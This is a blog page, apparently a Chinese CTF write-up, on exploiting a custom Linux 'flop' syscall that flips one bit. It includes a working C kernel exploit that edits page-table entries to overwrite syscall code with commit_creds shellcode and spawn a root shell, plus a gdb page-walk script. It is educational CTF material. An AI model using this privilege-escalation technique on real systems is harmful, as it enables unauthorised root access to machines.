@@ -1,0 +1,758 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="manifest" href="/images/site.webmanifest">
+  <link rel="shortcut icon" href="/images/favicon.ico">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Midnight Sun CTF 2025 Final - flop | Y² 的博客</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Midnight Sun CTF 2025 Final - flop" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="题目分析" />
+<meta property="og:description" content="题目分析" />
+<link rel="canonical" href="https://www.cameudis.com/2025/10/11/MidnightSunFinal-2025-Flop.html" />
+<meta property="og:url" content="https://www.cameudis.com/2025/10/11/MidnightSunFinal-2025-Flop.html" />
+<meta property="og:site_name" content="Y² 的博客" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-10-11T00:00:00+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Midnight Sun CTF 2025 Final - flop" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-10-11T00:00:00+08:00","datePublished":"2025-10-11T00:00:00+08:00","description":"题目分析","headline":"Midnight Sun CTF 2025 Final - flop","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.cameudis.com/2025/10/11/MidnightSunFinal-2025-Flop.html"},"url":"https://www.cameudis.com/2025/10/11/MidnightSunFinal-2025-Flop.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://www.cameudis.com/feed.xml" title="Y² 的博客" /><script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+</head>
+<body><header class="site-header" role="banner">
+  <div class="wrapper"><div class="header-content">
+      <div class="header-content-left">
+        <a class="site-title" rel="author" href="/">Y² 的博客</a>
+
+        <button class="search-button" id="search-toggle" aria-label="搜索">
+          <svg viewBox="0 0 24 24" width="20px" height="20px">
+            <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
+          </svg>
+        </button>
+      </div><nav class="site-nav">
+          <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+          <label for="nav-trigger">
+            <span class="menu-icon">
+              <svg viewBox="0 0 18 15" width="18px" height="15px">
+                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+              </svg>
+            </span>
+          </label>
+          <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/diary/">Y²のDiary</a><a class="page-link" href="/links/">Links</a><a class="page-link" href="/readings/">Readings</a></div>
+        </nav></div>
+  </div>
+</header>
+
+<!-- 搜索弹窗 -->
+<div class="search-overlay" id="search-overlay">
+  <div class="search-modal">
+    <div class="search-header">
+      <input type="text" id="search-input" placeholder="搜索文章..." autocomplete="off">
+      <button class="search-close" id="search-close">&times;</button>
+    </div>
+    <div class="search-results" id="search-results"></div>
+  </div>
+</div>
+
+<style>
+/* Header 样式修改 */
+.header-content {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+
+.header-content-left {
+  display: flex;
+  gap: 5px;
+}
+
+.search-button {
+  background: none;
+  border: none;
+  cursor: pointer;
+  padding: 8px;
+  border-radius: 4px;
+  transition: background-color 0.3s ease;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  float: left;
+}
+
+.search-button:hover {
+  background-color: rgba(0, 0, 0, 0.1);
+}
+
+.search-button svg {
+  fill: currentColor;
+}
+
+/* 搜索弹窗样式 */
+.search-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background: rgba(0, 0, 0, 0.5);
+  display: none;
+  z-index: 1000;
+  align-items: flex-start;
+  justify-content: center;
+  padding-top: 100px;
+}
+
+.search-overlay.active {
+  display: flex;
+}
+
+.search-modal {
+  background: white;
+  border-radius: 8px;
+  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+  width: 90%;
+  max-width: 600px;
+  max-height: 80vh;
+  overflow: hidden;
+  animation: searchModalIn 0.3s ease-out;
+}
+
+@keyframes searchModalIn {
+  from {
+    opacity: 0;
+    transform: translateY(-20px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+.search-header {
+  display: flex;
+  align-items: center;
+  padding: 20px;
+  border-bottom: 1px solid #eee;
+}
+
+.search-input, #search-input {
+  flex: 1;
+  border: none;
+  outline: none;
+  font-size: 18px;
+  padding: 10px 0;
+  background: transparent;
+}
+
+.search-close {
+  background: none;
+  border: none;
+  font-size: 24px;
+  cursor: pointer;
+  padding: 0;
+  margin-left: 15px;
+  color: #666;
+  width: 30px;
+  height: 30px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  border-radius: 50%;
+  transition: background-color 0.3s ease;
+}
+
+.search-close:hover {
+  background-color: #f0f0f0;
+}
+
+.search-results {
+  max-height: 400px;
+  overflow-y: auto;
+  padding: 10px 0;
+}
+
+.search-result {
+  padding: 15px 20px;
+  border-bottom: 1px solid #f0f0f0;
+  cursor: pointer;
+  transition: background-color 0.3s ease;
+}
+
+.search-result:hover {
+  background-color: #f8f9fa;
+}
+
+.search-result:last-child {
+  border-bottom: none;
+}
+
+.search-result h3 {
+  margin: 0 0 5px 0;
+  font-size: 16px;
+  color: #333;
+}
+
+.search-result h3 a {
+  text-decoration: none;
+  color: inherit;
+}
+
+.search-result p {
+  margin: 5px 0;
+  color: #666;
+  font-size: 14px;
+  line-height: 1.4;
+}
+
+.search-result small {
+  color: #999;
+  font-size: 12px;
+}
+
+.search-highlight {
+  background-color: #fff3cd;
+  padding: 1px 2px;
+  border-radius: 2px;
+}
+
+.search-no-results {
+  padding: 40px 20px;
+  text-align: center;
+  color: #666;
+}
+
+/* 响应式设计 */
+@media (max-width: 600px) {
+  .search-overlay {
+    padding-top: 50px;
+  }
+
+  .search-modal {
+    width: 95%;
+    margin: 0 auto;
+  }
+
+  .search-header {
+    padding: 15px;
+  }
+
+  .search-input, #search-input {
+    font-size: 16px;
+  }
+}
+</style>
+
+<script src="https://cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const searchClient = algoliasearch('YU3CCWYOVD', 'dec1d1e53d245f8fc3122fa9b41ab7ae');
+  const index = searchClient.initIndex('blog-jekyll');
+
+  const searchToggle = document.getElementById('search-toggle');
+  const searchOverlay = document.getElementById('search-overlay');
+  const searchClose = document.getElementById('search-close');
+  const searchInput = document.getElementById('search-input');
+  const searchResults = document.getElementById('search-results');
+
+  let searchTimeout;
+
+  searchToggle.addEventListener('click', function() {
+    searchOverlay.classList.add('active');
+    searchInput.focus();
+  });
+
+  // 关闭搜索弹窗
+  function closeSearch() {
+    searchOverlay.classList.remove('active');
+    searchInput.value = '';
+    searchResults.innerHTML = '';
+  }
+
+  searchClose.addEventListener('click', closeSearch);
+
+  // 点击遮罩关闭
+  searchOverlay.addEventListener('click', function(e) {
+    if (e.target === searchOverlay) {
+      closeSearch();
+    }
+  });
+
+  // ESC 键关闭
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape' && searchOverlay.classList.contains('active')) {
+      closeSearch();
+    }
+  });
+
+  // 搜索功能
+  searchInput.addEventListener('input', function() {
+    const query = this.value.trim();
+
+    clearTimeout(searchTimeout);
+
+    if (query.length === 0) {
+      searchResults.innerHTML = '';
+      return;
+    }
+
+    // 防抖处理
+    searchTimeout = setTimeout(() => {
+      performSearch(query);
+    }, 300);
+  });
+
+  function performSearch(query) {
+    index.search(query, {
+      hitsPerPage: 10,
+      attributesToHighlight: ['title', 'content'],
+      highlightPreTag: '<span class="search-highlight">',
+      highlightPostTag: '</span>'
+    }).then(({ hits }) => {
+      displayResults(hits, query);
+    }).catch(error => {
+      console.error('搜索错误:', error);
+      searchResults.innerHTML = '<div class="search-no-results">搜索出错，请稍后重试</div>';
+    });
+  }
+
+  function displayResults(hits, query) {
+    if (hits.length === 0) {
+      searchResults.innerHTML = '<div class="search-no-results">没有找到相关内容</div>';
+      return;
+    }
+
+    const resultsHtml = hits.map(hit => {
+      const title = hit._highlightResult?.title?.value || hit.title || '无标题';
+      const excerpt = hit._highlightResult?.content?.value || hit.excerpt || hit.content || '';
+      const url = hit.url || '#';
+      const date = hit.date || '';
+
+      // 截取摘要
+      const cleanExcerpt = excerpt.replace(/<[^>]*>/g, '').substring(0, 150);
+
+      return `
+        <div class="search-result" onclick="window.location.href='${url}'">
+          <h3><a href="${url}">${title}</a></h3>
+          <p>${cleanExcerpt}${cleanExcerpt.length === 150 ? '...' : ''}</p>
+          ${date ? `<small>${date}</small>` : ''}
+        </div>
+      `;
+    }).join('');
+
+    searchResults.innerHTML = resultsHtml;
+  }
+});
+</script>
+<main class="page-content" aria-label="Content">
+      
+      <div class="wrapper">
+        <div class="post-layout">
+          <!-- 左侧内容区域 -->
+          <div class="post-main">
+            <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+              <header class="post-header">
+                <h1 class="post-title p-name" itemprop="name headline">Midnight Sun CTF 2025 Final - flop</h1>
+                <p class="post-meta">
+                  <time class="dt-published" datetime="2025-10-11T00:00:00+08:00" itemprop="datePublished">Oct 11, 2025
+                  </time></p>
+              </header>
+
+              <div class="post-content e-content" itemprop="articleBody">
+                <h2 id="题目分析">题目分析</h2>
+
+<p>由于在网上搜不到题目附件，不得不手动搭了一个环境，内核版本为 <code class="language-plaintext highlighter-rouge">6.12.27</code>，关闭 <code class="language-plaintext highlighter-rouge">KASLR</code>、<code class="language-plaintext highlighter-rouge">KPTI</code> 保护。</p>
+
+<p>题目添加了一个自定义的系统调用：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/syscalls.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/mm.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/sched.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;asm/uaccess.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;asm/pgtable.h&gt;</span><span class="cp">
+</span>
+<span class="cp">#DEFINE SYS_FLOP 468
+</span>
+<span class="k">static</span> <span class="n">atomic_t</span> <span class="n">bit_flipped</span> <span class="o">=</span> <span class="n">ATOMIC_INIT</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+<span class="n">SYSCALL_DEFINE2</span><span class="p">(</span><span class="n">flop</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="n">bit_pos</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">target</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">atomic_cmpxchg</span><span class="p">(</span><span class="o">&amp;</span><span class="n">bit_flipped</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="k">return</span> <span class="o">-</span><span class="n">EPERM</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">bit_pos</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">bit_pos</span> <span class="o">&gt;=</span> <span class="mi">64</span><span class="p">)</span>
+        <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">)</span>
+        <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&gt;</span> <span class="n">__pa</span><span class="p">(</span><span class="n">high_memory</span><span class="p">))</span>
+        <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">)</span>
+        <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
+
+    <span class="n">target</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">__va</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="o">*</span><span class="n">target</span> <span class="o">&amp;</span> <span class="n">_PAGE_PRESENT</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="o">*</span><span class="n">target</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">))</span>
+        <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
+
+    <span class="o">*</span><span class="n">target</span> <span class="o">^=</span> <span class="p">(</span><span class="mi">1UL</span> <span class="o">&lt;&lt;</span> <span class="n">bit_pos</span><span class="p">);</span>
+    <span class="n">__flush_tlb_all</span><span class="p">();</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>总结来说，这个系统调用允许攻击者在满足下列条件的情况下，有一次翻转一个 bit 的机会：</p>
+<ul>
+  <li>地址范围在 <code class="language-plaintext highlighter-rouge">0x1000</code> ~ <code class="language-plaintext highlighter-rouge">high_memory</code> 且向 8 对齐</li>
+  <li>目标地址的值要么是 <code class="language-plaintext highlighter-rouge">0</code> 要么最低位为 <code class="language-plaintext highlighter-rouge">1</code> （即 <code class="language-plaintext highlighter-rouge">_PAGE_PRESENT</code>）</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">high_memory</code> 是一个用来标识直接映射区顶端的变量，这里就是在暗示我们攻击直接映射区的内存。另外代码中出现了 <code class="language-plaintext highlighter-rouge">_PAGE_PRESENT</code>、<code class="language-plaintext highlighter-rouge">__flush_tlb_all</code>，显然是在暗示我们修改页表（修改页表作为一种攻击手法，是本博客的老熟人了，详见 <a href="https://www.cameudis.com/2025/01/06/GhostWrite-2.html#%E4%BB%BB%E6%84%8F%E8%AF%BB%E6%94%BB%E5%87%BB">GhostWrite #2: 漏洞利用代码分析</a>）。</p>
+
+<h2 id="利用">利用</h2>
+
+<p>一个页表项的结构大致如下（这是最后一级 Page Table Entry 的格式，但其他几级也差不多，可见 linux 源码 <code class="language-plaintext highlighter-rouge">/arch/x86/64/include/paging_definitions.h</code>）：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span>
+<span class="p">{</span>
+  <span class="n">uint64</span> <span class="n">present</span>                   <span class="o">:</span><span class="mi">1</span><span class="p">;</span>
+  <span class="n">uint64</span> <span class="n">writeable</span>                 <span class="o">:</span><span class="mi">1</span><span class="p">;</span>
+  <span class="n">uint64</span> <span class="n">user_access</span>               <span class="o">:</span><span class="mi">1</span><span class="p">;</span>
+  <span class="n">uint64</span> <span class="n">write_through</span>             <span class="o">:</span><span class="mi">1</span><span class="p">;</span>
+  <span class="n">uint64</span> <span class="n">cache_disabled</span>            <span class="o">:</span><span class="mi">1</span><span class="p">;</span>
+  <span class="n">uint64</span> <span class="n">accessed</span>                  <span class="o">:</span><span class="mi">1</span><span class="p">;</span>
+  <span class="n">uint64</span> <span class="n">dirty</span>                     <span class="o">:</span><span class="mi">1</span><span class="p">;</span>
+  <span class="n">uint64</span> <span class="n">size</span>                      <span class="o">:</span><span class="mi">1</span><span class="p">;</span>
+  <span class="n">uint64</span> <span class="n">global</span>                    <span class="o">:</span><span class="mi">1</span><span class="p">;</span>
+  <span class="n">uint64</span> <span class="n">ignored_2</span>                 <span class="o">:</span><span class="mi">3</span><span class="p">;</span>
+  <span class="n">uint64</span> <span class="n">page_ppn</span>                  <span class="o">:</span><span class="mi">28</span><span class="p">;</span>
+  <span class="n">uint64</span> <span class="n">reserved_1</span>                <span class="o">:</span><span class="mi">12</span><span class="p">;</span> <span class="c1">// must be 0</span>
+  <span class="n">uint64</span> <span class="n">ignored_1</span>                 <span class="o">:</span><span class="mi">11</span><span class="p">;</span>
+  <span class="n">uint64</span> <span class="n">execution_disabled</span>        <span class="o">:</span><span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">__packed__</span><span class="p">))</span> <span class="n">PageTableEntry</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>其中，<code class="language-plaintext highlighter-rouge">writeable</code> 和 <code class="language-plaintext highlighter-rouge">user_access</code> 比较重要，前者标记页面是否可写，后者标记页面是否可以在用户态被访问。在一次虚拟地址转化为物理地址的过程中，会涉及到多层的页表，只要其中有一层的权限要求不满足，就会触发 page fault。</p>
+
+<h3 id="方法1劫持内核代码">方法1：劫持内核代码</h3>
+
+<p>我们可以修改页表，那么首先就可以考虑注入恶意代码，此在 <a href="https://www.cameudis.com/2023/11/29/HITCTF2023-xv6-Trusted.html">HITCTF 2023 xv6-Trusted</a> 中亦有记载。为了让恶意代码在内核态被执行，我们可以挑选一个内核中的函数进行劫持，然后从用户态触发这个函数的调用。由于题目没有开启 KPTI 保护（这一点很关键！），我们可以在劫持页表权限后，直接从用户态攻击内核的代码段。</p>
+
+<p>不妨就以 <code class="language-plaintext highlighter-rouge">__x64_sys_flop</code> 为目标，尝试把其代码覆盖掉。为此，我们需要获取其地址以及各级对应的页表（这里用到的 <code class="language-plaintext highlighter-rouge">va2pa</code> 函数在文末附上了）：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(qemu) gef➤  x/i __x64_sys_flop 
+   0xffffffff810a4070 &lt;__x64_sys_flop&gt;: endbr64
+(qemu) gef➤  va2pa 0xffffffff810a4070
+pml4e: 0x0000000001e2f067 at 0x03778ff8
+pdpte: 0x0000000001e30063 at 0x01e2fff0
+pde  : 0x00000000010001a1 at 0x01e30040
+phy  : 0x10a4070 [0x01000000-0x011fffff]
+</code></pre></div></div>
+
+<blockquote>
+  <p>Q：为什么这里只有三级而不是四级页表？
+A：PDE 的第 7 位为 1，表明这是一个 2MB 大页描述符，没有第四级页表。</p>
+</blockquote>
+
+<p>注意到，这里 <code class="language-plaintext highlighter-rouge">pdpte</code> 的配置是用户不可读、内核可读写；<code class="language-plaintext highlighter-rouge">pde</code> 的配置是用户不可读、内核可读。因此，如果想在用户态写入 <code class="language-plaintext highlighter-rouge">__x64_sys_flop</code>，一共需要修改三个 bits，分别使 <code class="language-plaintext highlighter-rouge">pdpte</code> 变成用户可访问、<code class="language-plaintext highlighter-rouge">pde</code> 变成用户可访问和可写入。我们具备的条件不足以修改三个 bits，因此这条路行不通。</p>
+
+<p>好在，我们知道这个函数除了在内核代码映射区内会被映射，还会同时存在于线性映射区域（直接映射区域）。从上可知 <code class="language-plaintext highlighter-rouge">__x64_sys_flop</code> 的物理地址是 <code class="language-plaintext highlighter-rouge">0x10a4070</code>，对应直接映射区地址是 <code class="language-plaintext highlighter-rouge">0xffff8880010a4070</code>，我们再来解析一下这个虚拟地址：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(qemu) gef➤  va2pa 0xffff8880010a4070
+pml4e: 0x0000000002201067 at 0x03778888
+pdpte: 0x0000000002202067 at 0x02201000
+pde  : 0x80000000010001a1 at 0x02202040
+phy  : 0x10a4070 [0x01000000-0x011fffff]
+</code></pre></div></div>
+
+<p>可以看到，这次我们需要修改 <code class="language-plaintext highlighter-rouge">pde</code> 的两个比特才能将这个映射变成用户可写。聪明的内核开发者对直接映射区做了保护，把里面属于代码的部分标记成不可写了！但是没关系，我们考虑 <code class="language-plaintext highlighter-rouge">pde</code> 本身，其作为数据（而非代码）也会在线性映射区中存在一个映射，而数据的映射则大概率是 <code class="language-plaintext highlighter-rouge">rw</code> 的：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(qemu) gef➤  va2pa 0xffff888002202040
+pml4e: 0x0000000002201067 at 0x03778888
+pdpte: 0x0000000002202067 at 0x02201000
+pde  : 0x80000000022001e3 at 0x02202088
+phy  : 0x2202040 [0x02200000-0x023fffff]
+</code></pre></div></div>
+
+<p>可以看到，这里确实只需要修改一个比特就可以从用户劫持了。由此我们得到了完整的攻击流程：</p>
+
+<ol>
+  <li>利用题目给出的条件，攻击目标（<code class="language-plaintext highlighter-rouge">__x64_sys_flop</code>） 在线性映射区的映射的 <code class="language-plaintext highlighter-rouge">pde</code> 部分在线性映射区的映射（也就是 <code class="language-plaintext highlighter-rouge">pde</code> 的 <code class="language-plaintext highlighter-rouge">pde</code>，套娃），将目标的 <code class="language-plaintext highlighter-rouge">pde</code> 变成用户可访问；</li>
+  <li>从用户态直接攻击目标在线性映射区映射的 <code class="language-plaintext highlighter-rouge">pde</code>，将目标变为用户可访问、可写；</li>
+  <li>从用户态直接劫持目标函数；</li>
+  <li>触发目标函数的调用。</li>
+</ol>
+
+<p>攻击代码如下：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"kernelpwn.h"</span><span class="cp">
+</span>
+<span class="cp">#define INIT_CRED "0xffffffff81e3ab80"
+#define COMMIT_CREDS "0xffffffff810a02f0"
+</span>
+<span class="kt">void</span> <span class="nf">rootkit</span><span class="p">();</span>
+<span class="n">asm</span><span class="p">(</span>
+    <span class="s">"rootkit:"</span>
+    <span class="s">"mov rdi, 0xffffffff81e3ab80;"</span>
+    <span class="s">"mov rax, 0xffffffff810a02f0;"</span>
+    <span class="s">"call rax;"</span>
+    <span class="s">"ret;"</span>
+<span class="p">);</span>
+<span class="kt">void</span> <span class="nf">rootkit_end</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span><span class="p">;</span> <span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="c1">// high_memory: 0xffff88800ffe0000</span>
+    <span class="c1">// range: 0x1000 ~ 0xffe0000</span>
+
+    <span class="c1">// __x64_sys_flop 0xffff8880010a4070</span>
+    <span class="c1">//   corresponding pte addr: 0x02202040 (v: 0xffff888002202040)</span>
+    <span class="c1">//   ^ corresponding pte addr: 0x02202088 (v: 0xffff888002202088)</span>
+
+    <span class="n">syscall</span><span class="p">(</span><span class="mi">468</span><span class="p">,</span> <span class="mh">0x2202088</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+
+    <span class="kt">uint64_t</span><span class="o">*</span> <span class="n">flop_pte</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="mh">0xffff888002202040</span><span class="p">;</span>
+    <span class="o">*</span><span class="n">flop_pte</span> <span class="o">|=</span> <span class="mi">6</span><span class="p">;</span>
+    <span class="c1">// sched_yield();</span>
+
+    <span class="kt">void</span><span class="o">*</span> <span class="n">flop</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="mh">0xffff8880010a4070</span><span class="p">;</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">flop</span><span class="p">,</span> <span class="n">rootkit</span><span class="p">,</span> <span class="n">rootkit_end</span> <span class="o">-</span> <span class="n">rootkit</span><span class="p">);</span>
+
+    <span class="kt">int</span> <span class="n">r</span> <span class="o">=</span> <span class="n">syscall</span><span class="p">(</span><span class="mi">468</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] syscall return: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
+
+    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span> <span class="c1">// BOOM!</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>如果题目没有开启 <code class="language-plaintext highlighter-rouge">SMAP</code> 保护的话，现在我们已经成功拿到 shell 了。不过，如果此时开启了 <code class="language-plaintext highlighter-rouge">SMAP</code>，有几率会在内核处理 <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code> 或更之后的时候发生 panic，报错大致如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BUG: unable to handle page fault for address: ffff888002363000
+#PF: supervisor read access in kernel mode
+#PF: error_code(0x0001) - permissions violation
+PGD 2201067 P4D 2201067
+</code></pre></div></div>
+
+<p>这是因为我们把直接映射区的两个大页改成了用户可访问，内核去读写那里的数据时，就会被 <code class="language-plaintext highlighter-rouge">SMAP</code> 拦下。解决方法就是在攻击完毕之后进行清理，只需要在最后的 <code class="language-plaintext highlighter-rouge">system</code> 前添加下面这两行代码即可：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">// recover page table</span>
+    <span class="o">*</span><span class="n">flop_pte</span> <span class="o">^=</span> <span class="mi">6</span><span class="p">;</span>
+    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="mh">0xffff888002202088</span> <span class="o">^=</span> <span class="mi">4</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>就可以成功拿到 flag：</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~ <span class="nv">$ </span>./exp
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> syscall <span class="k">return</span>: 0
+~ <span class="c"># id</span>
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+~ <span class="c"># cat /flag</span>
+flag<span class="o">{</span>你怎么知道cameudis有对象了?<span class="o">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>注：有一次调试的时候遇到了挫折（如下图所示，发现直接映射区缺了一块映射），本来以为是内核做了保护把代码段除外了，后来发现疑似是自己 exp 写得有点烂，把页表搞得乱七八糟导致的（）</p>
+
+  <p><img src="https://blog-1308958542.cos.ap-shanghai.myqcloud.com/20251010204440251.png" alt="" /></p>
+
+  <p>所以内核是不是可以做一个保护把代码段直接不映射？</p>
+</blockquote>
+
+<h3 id="方法-2搜索-ramdisk-中的-flag-文件todo">方法 2：搜索 ramdisk 中的 flag 文件（TODO）</h3>
+
+<p>由于题目给出的 flag 直接存在于 ramdisk 里，因此也会被加载到内存中。我们可以先在调试环境搜索到 flag 的位置，然后在脚本中暴力搜索周围的内存空间。虽然 flag 的位置有随机性，但由于线性映射区都是大页映射，因此我们可以在修改完 1 个比特之后就开始搜索大页，甚至也可以使用类似于方法 1 中的套娃技巧，将控制范围再度扩大。</p>
+
+<p>不过由于笔者还没装好 <a href="https://github.com/bata24/gef">Kernel特化版gef</a>（这玩意一键安装脚本只支持 debian 系是什么鬼？），默认的 gef 又没办法在 qemu 模式下搜索内存，这种方法就先咕咕咕了！</p>
+
+<hr />
+
+<h2 id="附录">附录</h2>
+
+<p>简陋的 va2ga gdb 脚本（只支持 linux x64 4级页表映射）：</p>
+
+<pre><code class="language-gdb">define phy4pxe
+    if $argc != 1
+        printf "Usage: phy4pxe &lt;pml4e|pdpte|pde|pte&gt;\n"
+    else 
+        set $mask40 = (((unsigned long)1 &lt;&lt; 40)-1)
+        set $result = (($arg0 &gt;&gt; 12) &amp; $mask40) &lt;&lt; 12
+    end
+end
+
+define va2pa
+    set $directmappingbase = 0xffff888000000000
+    set $target = 0xffff888000000000
+    set $mask9  = ((1 &lt;&lt; 9) - 1)
+    set $mask12 = ((1 &lt;&lt; 12) - 1)
+    set $mask21 = ((1 &lt;&lt; 21) - 1)
+    set $mask30 = ((1 &lt;&lt; 30) - 1)
+    set $mask40 = (((unsigned long)1 &lt;&lt; 40) - 1)
+
+    if $argc &gt;= 1
+        set $target = $arg0
+    end
+
+    phy4pxe $cr3
+    set $pml4ephy = $result + (($target &gt;&gt; 39) &amp; $mask9) * 8
+    set $pml4e = *(unsigned long*)($directmappingbase + $pml4ephy)
+    printf "pml4e: 0x%016lx at 0x%08x\n", $pml4e, $pml4ephy
+
+    phy4pxe $pml4e
